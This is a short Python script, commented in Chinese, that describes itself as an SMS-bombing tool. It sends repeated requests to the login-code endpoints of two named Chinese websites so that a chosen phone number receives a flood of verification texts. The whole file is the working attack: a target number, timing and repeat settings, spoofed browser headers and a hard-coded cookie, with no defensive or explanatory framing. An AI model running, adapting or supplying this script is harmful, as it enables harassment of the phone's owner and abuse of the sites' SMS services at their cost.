import requests
import time

# 利用爬虫的思想，对一些网站用手机号重复注册，造成短信轰炸的效果
'''
Sleep ：  发送短信的间隔(s)，建议不低于10s
Tel ：    要发送短信的手机号码
Number ： 大约轰炸总次数，可能会有失败
'''
Sleep = 10
Tel = 15600000000
Number = 3


class Get_Request:
    def run(self):
        print("*" * 10 + self.name + "*" * 10)
        try:
            response = requests.get(url=self.url, headers=self.header)
            print("Send Request Success ")
            print("Status code: {}".format(response))
            print("Content: " + response.text)
        except:
            print("Warning : Send Request Fail ")
        time.sleep(Sleep)


class SMS_Send_Maodou(Get_Request):
    def __init__(self, phone):
        self.name = "毛豆新车网"
        self.phone = phone
        self.url = "https://uc.maodou.com/server/account/sendLoginCode?phone=" + str(phone)
        self.header = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20200101 Firefox/68.0",
            "Referer": "https://www.maodou.com/",
            "Origin": "https://www.maodou.com"
        }


class SMS_Send_Youjiang(Get_Request):
    def __init__(self, phone):
        self.name = "有讲"
        self.phone = phone
        self.url = "https://www.yojiang.cn/api/user/send_verify_code?phone=" + str(phone)
        self.header = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 Html5Plus/1.0',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
            'cache-control': 'max-age=0',
            "X-Requested-With": "XMLHttpRequest",
            'cookie': "guest_uuid=5e3626fd9b6dde14e9293bee; _xsrf=2|a63a71a2|6bfa82e8f3ff66bbf83b67c2a67a9cf5|1580823294; Hm_lvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404; Hm_lpvt_91f2894c14ed1eb5a6016e859758fb9c=1580825404"
        }


if __name__ == '__main__':
    sms_Maodou = SMS_Send_Maodou(Tel)
    sms_Youjiang = SMS_Send_Youjiang(Tel)
    i = 0
    while i < Number:
        i += 1
        sms_Maodou.run()
        sms_Youjiang.run()
